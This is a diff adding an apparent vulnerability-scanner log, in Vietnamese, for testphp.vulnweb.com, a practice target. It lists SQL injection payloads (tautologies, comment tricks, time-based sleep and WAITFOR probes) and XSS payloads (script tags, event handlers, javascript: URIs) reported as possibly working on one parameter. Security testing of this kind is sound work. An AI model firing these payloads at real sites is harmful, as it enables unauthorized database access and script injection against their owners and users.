@@ -1,0 +1,46 @@
+[TIME] 2025-07-24 08:58:24
+[URL] http://testphp.vulnweb.com/artists.php?artist=
+======= SQLi =======
+
+[*] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị tấn công SQLi với các payloads:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - ') OR ('1'='1
+    - " OR 1=1 --
+    - ' OR 1=1#
+    - " OR 1=1#
+    - admin' --
+    - 1' or '1' = '1
+    - ' AND 1=1 --
+    - ' AND 1=2 --
+    - " AND 1=1 --
+    - " AND 1=2 --
+    - ') AND '1'='1
+    - ') AND '1'='2
+    - " OR "" = "
+    - ' OR '' = '
+    - '; WAITFOR DELAY '0:0:5' --
+    - '; SELECT pg_sleep(5)--
+    - " OR SLEEP(5) --
+    - ') OR SLEEP(5) --
+    - " OR 1=1; SLEEP(5) --
+    - admin' OR SLEEP(3)--
+    - 1); SELECT sleep(5);--
+
+
+======= XSS =======
+
+[*] Đang kiểm tra XSS trên: http://testphp.vulnweb.com/artists.php?artist=
+[!] Có thể bị tấn công XSS với các payloads:
+    - <script>alert(1)</script>
+    - <video src=1 onerror=alert(9)>
+    - "><img src=x onerror=alert(2)>
+    - '><svg/onload=alert(3)>
+    - <iframe src="javascript:alert(5)">
+    - <details open ontoggle=alert(7)>
+    - <math href="javascript:alert(6)">
+    - "><svg onmouseover=alert(4)>
+    - <marquee onstart=alert(8)>
+
+
